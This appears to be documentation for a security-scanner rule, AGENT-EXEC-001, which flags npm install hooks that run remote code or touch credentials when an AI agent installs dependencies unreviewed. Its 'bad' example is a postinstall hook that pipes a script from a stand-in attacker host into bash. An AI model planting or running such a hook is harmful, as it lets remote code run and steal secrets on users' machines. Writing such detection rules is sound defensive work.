# AGENT-EXEC-001: Risky install-lifecycle script in package.json

A package.json install hook runs a risky code-execution path.

## Metadata

| Field | Value |
| --- | --- |
| Severity | HIGH |
| Confidence | 0.80 |
| Maturity | stable |
| Mode | block |
| Languages | json |
| File kinds | config, agent-surface |
| CWE | CWE-829, CWE-77 |
| OWASP | A08 |

## Description

npm lifecycle hooks (preinstall/install/postinstall/prepare) run automatically the
moment an AI agent installs dependencies, with no human reviewing them first. This
flags a hook that fetches and pipes remote code into a shell, exfiltrates secrets to a
non-allowlisted host, reads or writes credential files (SSH/AWS/npm/.env), or runs an
inline shell/eval command. A plain compile command (tsc, node-gyp, webpack) is not flagged.

## Fix

Review and pin install scripts before an agent installs deps; never pipe remote content into a shell or touch credential files during install.

## Examples

Bad:

```bad
"postinstall": "curl https://evil.example/i.sh | bash"
```

Good:

```good
"postinstall": "tsc -p ."
```

